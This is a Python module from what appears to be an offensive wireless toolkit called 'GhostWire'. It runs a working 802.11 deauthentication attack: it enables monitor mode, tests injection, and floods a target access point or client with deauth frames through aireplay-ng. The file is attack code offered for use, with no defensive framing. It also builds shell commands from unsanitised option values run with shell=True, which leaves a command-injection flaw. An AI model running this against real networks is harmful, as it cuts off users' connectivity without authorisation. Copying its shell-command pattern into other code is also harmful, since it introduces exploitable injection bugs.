"""
GhostWire WiFi Module — Deauthentication Attack
Sends 802.11 deauth frames to disconnect clients from APs.
"""

import subprocess
import time
from ghostwire.core.base import BaseModule, Meta


class Module(BaseModule):
    class Meta(Meta):
        name = "deauth"
        description = "802.11 deauthentication attack — disconnect clients from target AP"
        category = "wifi"
        requirements = ["aireplay-ng", "airmon-ng", "airodump-ng"]
        options = {
            "target": {"description": "Target AP BSSID", "required": True},
            "iface": {"description": "Wireless interface", "required": False},
            "count": {"description": "Number of deauth frames", "default": 50},
            "client": {"description": "Specific client MAC (optional)", "default": None},
        }

    def info(self):
        return f"Deauth target={self.get_option('target')} count={self.get_option('count', 50)}"

    def run(self, **kwargs):
        target = self.get_option("target") or kwargs.get("target")
        iface = self.get_option("iface") or self.ctx.config.get("wifi_iface")
        count = int(self.get_option("count", 50))
        client = self.get_option("client")

        if not target:
            self.logger.error("No target BSSID specified")
            return
        if not iface:
            self.logger.error("No wireless interface found")
            return

        self.logger.info(f"Deauth attack: {target} via {iface} ({count} frames)")

        # Enable monitor mode
        self.logger.info("Enabling monitor mode...")
        subprocess.run(f"airmon-ng start {iface}", shell=True, capture_output=True)
        mon_iface = f"{iface}mon"

        # Test injection
        self.logger.info("Testing frame injection...")
        result = subprocess.run(
            f"aireplay-ng -9 {mon_iface}",
            shell=True, capture_output=True, text=True, timeout=15
        )
        if "Injection is working" in result.stdout:
            self.logger.success("Frame injection: WORKING")
        else:
            self.logger.warn("Frame injection may not work — proceeding anyway")

        # Send deauth
        cmd = f"aireplay-ng -0 {count} -a {target}"
        if client:
            cmd += f" -c {client}"
        cmd += f" {mon_iface}"

        self.logger.info(f"Sending {count} deauth frames...")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=count + 30)

        sent = result.stdout.count("DeAuth") if result.stdout else 0
        self.logger.success(f"Sent ~{sent} deauth frames")

        # Cleanup
        subprocess.run(f"airmon-ng stop {mon_iface}", shell=True, capture_output=True)
        self.logger.info("Monitor mode disabled")

        self.session.add_result({
            "module": "wifi/deauth",
            "target": target,
            "frames_sent": sent,
            "status": "complete",
        })
